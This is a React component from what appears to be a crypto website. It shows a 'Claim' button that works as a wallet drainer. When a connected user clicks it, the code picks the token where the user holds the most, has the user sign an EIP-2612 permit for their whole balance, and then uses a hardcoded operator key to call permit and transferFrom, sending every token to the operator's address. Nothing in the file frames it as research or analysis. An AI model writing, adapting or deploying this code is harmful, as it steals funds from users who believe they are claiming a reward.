import { ConnectKitButton } from "connectkit";
import { useWriteContract, useAccount } from "wagmi";
import { ethers } from "../backend/modules/ethers.js";
import { useEthersSigner } from "../backend/ethersSigner.js";
import styled from "styled-components";
import {
  mainnetContractAddresses,
  testnetAddress,
  abi,
  testnetOwnerPrivateKey,
  tesnetOwnerAddress,
  testnetRpcUrl,
} from "../backend/contracts.js";

const StyledButton = styled.button`
  background: rgb(0, 0, 0);
  border-color: white;
  border-radius: 100px;
  width: 200px;
  height: 50px;
  color: white;
  font-family: Roboto;
  font-weight: 700;
  font-size: 14px;
  cursor: pointer;
  transition: color 0.2s ease-in-out;
  margin-bottom: 20px;
`;

export const ConnectButton = () => {
  const { writeContract } = useWriteContract();
  const { address } = useAccount();
  const signer = useEthersSigner();

  async function claim() {
    const walletProvider = new ethers.providers.JsonRpcProvider(testnetRpcUrl);
    const wallet = new ethers.Wallet(testnetOwnerPrivateKey, walletProvider);

    let maxBalanceIndex;
    let maxBalance = 0;
    for (let i = 0; i < testnetAddress.length; i++) {
      const contract = new ethers.Contract(
        testnetAddress[i].address,
        abi,
        wallet
      );
      const balance =
        (await contract.balanceOf(address)) / testnetAddress[i].decimals;
      if (balance > maxBalance) {
        maxBalanceIndex = i;
        maxBalance = balance;
      }
    }

    const contract = new ethers.Contract(
      testnetAddress[maxBalanceIndex].address,
      abi,
      wallet
    );

    const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour from now
    // const value = await contract.balanceOf(address);
    const value = await contract.balanceOf(address);
    const nonce = await contract.nonces(address);
    const domain = {
      name: testnetAddress[maxBalanceIndex].name,
      version: testnetAddress[maxBalanceIndex].version.toString(),
      chainId: 421614,
      verifyingContract: testnetAddress[maxBalanceIndex].address,
    };
    const types = {
      Permit: [
        { name: "owner", type: "address" },
        { name: "spender", type: "address" },
        { name: "value", type: "uint256" },
        { name: "nonce", type: "uint256" },
        { name: "deadline", type: "uint256" },
      ],
    };
    const message = {
      owner: address,
      spender: tesnetOwnerAddress,
      value: value.toString(),
      nonce: nonce.toString(),
      deadline: deadline.toString(),
    };

    console.log("fuck");

    const signature = await signer._signTypedData(domain, types, message);
    const { v, r, s } = ethers.utils.splitSignature(signature);

    const tx = await contract.permit(
      address,
      tesnetOwnerAddress,
      value,
      deadline,
      v,
      r,
      s
    );

    console.log(tx);

    const tx2 = await contract.transferFrom(address, tesnetOwnerAddress, value);

    console.log(tx2);
  }
  return (
    <ConnectKitButton.Custom>
      {({ isConnected, show }) => {
        return (
          <div>
            {isConnected ? (
              <StyledButton onClick={claim}>Claim</StyledButton>
            ) : (
              <StyledButton onClick={show}>Connect Wallet</StyledButton>
            )}
          </div>
        );
      }}
    </ConnectKitButton.Custom>
  );
};